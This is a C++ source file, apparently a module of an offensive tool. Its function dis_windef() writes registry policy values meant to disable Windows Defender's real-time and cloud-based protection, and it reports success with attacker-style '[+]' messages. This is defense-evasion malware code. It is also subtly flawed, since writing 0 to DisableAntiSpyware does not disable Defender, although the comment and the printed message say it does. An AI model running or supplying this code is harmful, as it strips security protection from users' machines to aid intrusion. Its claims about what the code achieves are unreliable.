#include "disable_windef.h"

int dis_windef() {
    // Disable Windows Defender real-time protection
    
    HKEY hKey;
    DWORD value = 0;



    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD)) == ERROR_SUCCESS) {
            std::cout << "[+] Windows Defender real-time protection disabled." << std::endl;
        }
        else {
            std::cerr << "[-] Error setting registry value." << std::endl;
        }
        RegCloseKey(hKey);
    }
    else {
        std::cerr << "[-] Error opening registry key." << std::endl;
    }

    // Disable Windows Defender cloud-based protection
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, L"SpynetReporting", 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD)) == ERROR_SUCCESS) {
            std::cout << "[+] Windows Defender cloud-based protection disabled." << std::endl;
        }
        else {
            std::cerr << "[-] Error setting registry value." << std::endl;
        }
        RegCloseKey(hKey);
    }
    else {
        std::cerr << "[-] Error opening registry key." << std::endl;
    }

    return 0;
}

